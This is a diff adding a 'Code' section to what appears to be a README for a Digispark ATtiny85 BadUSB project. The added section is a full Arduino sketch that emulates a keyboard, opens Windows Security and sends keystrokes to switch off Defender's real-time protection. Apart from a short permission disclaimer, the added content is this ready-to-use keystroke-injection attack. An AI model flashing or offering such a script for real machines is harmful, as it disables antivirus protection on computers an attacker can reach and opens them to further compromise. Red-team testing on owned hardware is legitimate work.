@@ -88,6 +88,72 @@ Do NOT use on machines you don’t own or have explicit permission to test.
 
 * Digispark ATtiny85 @ 16.5 MHz.
 
+# Code
+```bash
+// Turn OFF/ON REAL TIME PROTECTION WINDOWS
+
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.sendKeyStroke(0);     // Init HID
+  DigiKeyboard.delay(3000);          // Give Windows time to fully detect USB
+
+  // Open Start Menu
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
+  DigiKeyboard.delay(700);
+
+  // Search for Windows Security
+  DigiKeyboard.print("windows security");
+  DigiKeyboard.delay(500);
+
+  // Open top search result
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+
+  // Activate focused element
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(800);
+
+  // Move focus inside the Windows Security window
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(400);
+
+  // Move focus inside the Windows Security window
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(400);
+
+  // Move focus inside the Windows Security window
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(400);
+ 
+  // Move focus inside the Windows Security window
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(400);
+ 
+  // Activate focused element
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+
+  // Activate focused element
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+
+  DigiKeyboard.print(" ");
+  DigiKeyboard.delay(1000);
+
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+
+  // Activate focused element
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+
+}
+
+void loop() {
+  // nothing
+}
+```
+
 
 # License
 
